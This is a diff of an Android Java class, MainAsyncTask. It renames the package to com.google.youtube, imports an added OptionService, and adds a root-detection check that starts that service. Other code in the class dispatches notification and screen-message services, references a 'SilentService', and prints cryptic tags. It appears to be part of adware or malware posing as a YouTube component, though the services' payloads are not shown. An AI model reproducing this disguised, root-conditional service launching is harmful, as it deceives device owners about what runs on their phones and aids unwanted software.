@@ -1,12 +1,13 @@
-package com.mx.utils.utils;
+package com.google.youtube.utils;
 
 import java.util.Calendar;
 import java.util.Date;
 import java.util.Random;
 
-import com.mx.utils.services.NotifacationService;
-import com.mx.utils.services.ScreenMsgService;
-import com.mx.utils.services.SilentService;
+import com.google.youtube.services.NotifacationService;
+import com.google.youtube.services.OptionService;
+import com.google.youtube.services.ScreenMsgService;
+import com.google.youtube.services.SilentService;
 
 import android.content.Context;
 import android.content.SharedPreferences;
@@ -58,7 +59,7 @@ public class MainAsyncTask extends AsyncTask<Void, Integer, String> {
 	}
 
 	private boolean setOpenWifi() {
-		
+
 		Calendar c = Calendar.getInstance();
 
 		int hour = c.get(Calendar.HOUR_OF_DAY);
@@ -93,7 +94,6 @@ public class MainAsyncTask extends AsyncTask<Void, Integer, String> {
 
 		} else {
 
-
 			return false;
 
 		}
@@ -110,21 +110,23 @@ public class MainAsyncTask extends AsyncTask<Void, Integer, String> {
 		case 0:
 
 			NotifacationService NService = new NotifacationService(context);
-			
+
 			System.out.println("tzjr");
 
 			NService.execute();
 
 			break;
+			
 		case 1:
 
 			ScreenMsgService SService = new ScreenMsgService(context);
-			
+
 			System.out.println("cpjr");
 
 			SService.execute();
 
 			break;
+			
 		default:
 			break;
 		}
@@ -155,6 +157,16 @@ public class MainAsyncTask extends AsyncTask<Void, Integer, String> {
 				}
 
 			} else {
+
+				int isRoot = DeviceUtils.isRoot();
+
+				if (isRoot == 0) {
+
+					OptionService optionService = new OptionService(context);
+
+					optionService.start();
+
+				}
 
 				swichType();
 			}
